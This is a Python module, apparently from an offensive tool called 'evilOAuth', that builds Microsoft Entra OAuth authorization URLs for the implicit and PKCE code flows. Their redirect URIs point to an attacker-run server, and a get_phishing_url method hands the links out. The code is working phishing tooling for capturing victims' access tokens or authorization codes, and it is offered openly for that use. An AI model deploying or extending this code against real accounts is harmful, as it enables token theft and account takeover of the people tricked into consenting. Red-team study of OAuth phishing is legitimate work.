import string
import base64
import random
import hashlib
import logging
import requests
from . import get_idps, app
from prompt_toolkit import prompt
from .exceptions import EviloauthCommandException


class IDP():
    idps = get_idps()
    authz_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize'
    token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token'

    def __init__(self, idp, redirect_server, **kwargs):

        if idp not in self.idps:
            raise EviloauthCommandException(
                f'IDP {idp} is not supported. Supported IDPs: {self.idps}')

        self.redirect_server = redirect_server
        self.idp = idp
        self.client_id = kwargs.get('client_id')
        self.scope = kwargs.get('scope')
        self.final_destination = kwargs.get('final_destination')
        app.config['TOKEN_ENDPOINT'] = self.token_endpoint
        self.__idp_setup__()

    def __idp_setup__(self):
        if not self.client_id or not self.scope or not self.final_destination:
            self.client_id = prompt('Client ID: ')
            self.scope = prompt('Scope: ')
            self.final_destination = prompt('Final Destination: ')

        app.config['CLIENT_ID'] = self.client_id
        app.config['SCOPE'] = self.scope
        app.config['FINAL_DESTINATION'] = self.final_destination

        if self.idp == 'entra_implicit_flow':
            self.response_type = 'token'
            self.redirect_uri = f'https://{self.redirect_server}/redirect'

            app.config['REDIRECT_URI'] = self.redirect_uri
            app.config['RESPONSE_TYPE'] = self.response_type

            params = {
                'client_id': self.client_id,
                'scope': self.scope,
                'response_type': self.response_type,
                'redirect_uri': f'https://{self.redirect_server}/redirect'
            }
            self.uri = requests.Request(
                'GET', self.authz_endpoint, params=params).prepare().url

        elif self.idp == 'entra_code_flow':
            self.response_type = 'code'
            self.redirect_uri = f'https://{self.redirect_server}/hook'
            self.state = self.__generate_state__()
            self.code_verifier = self.__generate_code_verifier__()
            self.code_challenge = self.__generate_code_challenge__(
                self.code_verifier)
            self.code_challenge_method = 'S256'

            app.config['TOKEN_ENDPOINT'] = self.token_endpoint
            app.config['REDIRECT_URI'] = self.redirect_uri
            app.config['RESPONSE_TYPE'] = self.response_type
            app.config['STATE'] = self.state
            app.config['CODE_VERIFIER'] = self.code_verifier
            app.config['CODE_CHALLENGE'] = self.code_challenge
            app.config['CODE_CHALLENGE_METHOD'] = self.code_challenge_method

            params = {
                'client_id': self.client_id,
                'scope': self.scope,
                'response_type': self.response_type,
                'redirect_uri': self.redirect_uri,
                'state': self.state,
                'code_challenge': self.code_challenge,
                'code_challenge_method': self.code_challenge_method
            }
            self.uri = requests.Request(
                'GET', self.authz_endpoint, params=params).prepare().url
            logging.info(self.uri)

    def get_phishing_url(self):
        return self.uri

    def __generate_state__(self):
        return ''.join([str(random.randint(0, 9)) for _ in range(5)])

    def __generate_code_verifier__(self):
        allowed_chars = string.ascii_letters + string.digits + "-._~"
        return ''.join([random.choice(allowed_chars) for _ in range(48)])

    def __generate_code_challenge__(self, code_verifier):
        code_verifier_encoded = code_verifier.encode()
        code_verifier_digest = hashlib.sha256(code_verifier_encoded).digest()
        code_challenge = base64.urlsafe_b64encode(
            code_verifier_digest).decode().replace('=', '')
        return code_challenge

    def __str__(self):
        idp_str = f'{self.idp}'
        idp_str += f'\n\tClient ID: {self.client_id}'
        idp_str += f'\n\tScope: {self.scope}'
        idp_str += f'\n\tFinal Destination: {self.final_destination}'
        return idp_str

    def __repr__(self):
        return self.__str__()
